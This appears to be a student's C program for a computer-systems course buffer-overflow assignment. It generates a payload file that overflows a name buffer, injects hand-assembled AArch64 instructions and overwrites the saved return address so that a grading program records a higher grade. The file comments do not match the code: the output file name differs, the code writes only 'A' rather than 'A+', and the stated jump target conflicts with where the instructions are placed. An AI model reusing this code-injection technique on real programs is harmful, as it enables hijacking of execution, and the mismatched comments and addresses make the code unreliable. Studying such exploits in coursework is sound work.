/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Joshua (Kimyung) Song, Sergei Kudriavtcev                  */
/*--------------------------------------------------------------------*/

/* File comment:
 Produces a file called dataAplus that earns an A+. The file first
 writes the readable name and a null byte into the name array, then
 writes instructions later in the same array. It pads to getName's
 saved x30 and overwrites x30 with the address of those instructions.
 When getName returns, the injected instructions write 'A' and '+' into
 grade, then branch back to main.
 */

#include <stdio.h>
#include "miniassembler.h"

/* Function comment:
main takes no command-line arguments and does not read from stdin or
any other input stream. It writes binary data directly into a file
named "dataAplus", and produces no output to stdout or stderr. The
function returns 0 on success.
*/
int main(void) {
    FILE *psFile;
    unsigned int uiInstr;
    unsigned long ulAddr;
    int i;

    psFile = fopen("dataA", "w");
    fprintf(psFile, "Josh Song"); /* prints name bytes */
    putc('\0', psFile);

    /* padding for name "Josh Song" */
    for (i = 10; i < 16; i++)
      putc(0x41, psFile);

    /* instruction 1 at name[16], #65 in ASCII is 'A'*/
    uiInstr = MiniAssembler_mov(1, 65); /* mov w1, #65 */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 2 at name[20], 0x42006c is the address of grade */
    /* adr x0, grade */
    uiInstr = MiniAssembler_adr(0, 0x420044, 0x42006c);
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 3 at name[24], 'A' in to grade*/
    uiInstr = MiniAssembler_strb(1, 0); /* strb w1, [x0] */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* instruction 4 at name[28], branch back to main */
    uiInstr = MiniAssembler_b(0x40089c, 0x420074); /* b 0x40089c */
    fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* padding */
    for (i = 32; i < 48; i++) {
        putc('A', psFile);
    }

    /* write address of name[0] in x30 */
    ulAddr = 0x420058;
    fwrite(&ulAddr, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 0;
}
